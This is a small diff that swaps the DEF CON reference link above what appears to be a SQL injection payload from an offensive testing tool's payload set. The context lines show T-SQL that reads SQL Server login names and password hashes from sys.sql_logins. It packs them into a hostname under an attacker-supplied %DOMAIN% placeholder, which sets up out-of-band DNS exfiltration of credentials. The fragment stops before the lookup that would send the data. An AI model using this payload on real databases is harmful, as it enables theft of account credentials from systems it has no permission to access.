@@ -1,4 +1,4 @@
-# Reference: http://www.defcon.org/images/defcon-17/dc-17-presentations/defcon-17-joseph_mccray-adv_sql_injection.pdf
+# Reference: http://www.defcon.org/images/defcon-15/dc15-presentations/dc-15-karlsson.pdf
 
 DECLARE @host varchar(1024);
 SELECT @host = name + '-' + master.sys.fn_varbintohexstr(password_hash) + '.%DOMAIN%' FROM sys.sql_logins;
